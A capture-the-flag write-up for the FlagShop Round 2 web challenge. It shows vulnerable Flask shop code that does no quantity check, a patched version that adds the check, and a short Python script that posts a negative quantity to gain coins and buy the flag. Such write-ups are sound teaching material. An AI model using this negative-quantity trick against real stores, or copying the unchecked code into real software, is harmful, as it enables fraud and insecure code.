# Web — FlagShop Round 2 (Same Bug, Source Provided)

## Challenge Information
- **Category**: Web Exploitation
- **Difficulty**: Easy
- **Points**: Unknown
- **Flag**: Same as FlagShop Round 1
- **Note**: Source code provided

## Description
This is the same FlagShop challenge as Round 1, but with the source code provided to confirm the vulnerability.

## Vulnerability

The exact same negative quantity logic bug exists. See [FlagShop (Round 1)](15-Web-FlagShop-Logic-Bug.md) for the complete writeup.

## Source Code Analysis

With the source code provided, we can confirm the vulnerable code:

```python
@app.route('/', methods=['GET', 'POST'])
def shop():
    if 'coins' not in session:
        session['coins'] = 10
    
    if request.method == 'POST':
        item = request.form.get('item')
        qty = int(request.form.get('qty'))
        
        # VULNERABLE: No validation that qty > 0
        total = ITEMS[item] * qty
        
        if session['coins'] >= total:
            session['coins'] -= total
            
            if item == 'flag':
                return render_template('shop.html', 
                                     message=f"Here's your flag: {FLAG}",
                                     coins=session['coins'])
            else:
                return render_template('shop.html',
                                     message=f"Purchased {qty} {item}(s)",
                                     coins=session['coins'])
        else:
            return render_template('shop.html',
                                 message="Not enough coins!",
                                 coins=session['coins'])
    
    return render_template('shop.html', coins=session['coins'])
```

## The Fix

To patch this vulnerability:

```python
@app.route('/', methods=['GET', 'POST'])
def shop():
    if 'coins' not in session:
        session['coins'] = 10
    
    if request.method == 'POST':
        item = request.form.get('item')
        qty = int(request.form.get('qty'))
        
        # FIX: Validate quantity is positive
        if qty <= 0:
            return render_template('shop.html',
                                 message="Invalid quantity!",
                                 coins=session['coins'])
        
        total = ITEMS[item] * qty
        
        if session['coins'] >= total:
            session['coins'] -= total
            
            if item == 'flag':
                return render_template('shop.html', 
                                     message=f"Here's your flag: {FLAG}",
                                     coins=session['coins'])
            else:
                return render_template('shop.html',
                                     message=f"Purchased {qty} {item}(s)",
                                     coins=session['coins'])
        else:
            return render_template('shop.html',
                                 message="Not enough coins!",
                                 coins=session['coins'])
    
    return render_template('shop.html', coins=session['coins'])
```

## Exploit

Same exploit as Round 1:

```python
import requests
import re

session = requests.Session()
BASE = 'https://flagshop-round2.zerodays.events'

# Exploit negative quantity
session.post(BASE + '/', data={'item': 'sticker', 'qty': '-100'})

# Buy flag
response = session.post(BASE + '/', data={'item': 'flag', 'qty': '1'})

# Extract flag
flag = re.search(r'ZeroDays\{[^}]+\}', response.text)
print(flag.group())
```

## Lessons Learned

Having the source code confirms:
1. The vulnerability is exactly as suspected
2. No additional security measures are in place
3. The fix is straightforward (add input validation)
4. Source code review is essential for security

---

**Flag**: Same as FlagShop Round 1

**Solved**: ✅

**Key Takeaway**: Source code access makes vulnerability identification trivial. Always validate input, especially for financial calculations. This challenge demonstrates why code review and input validation are critical security practices.
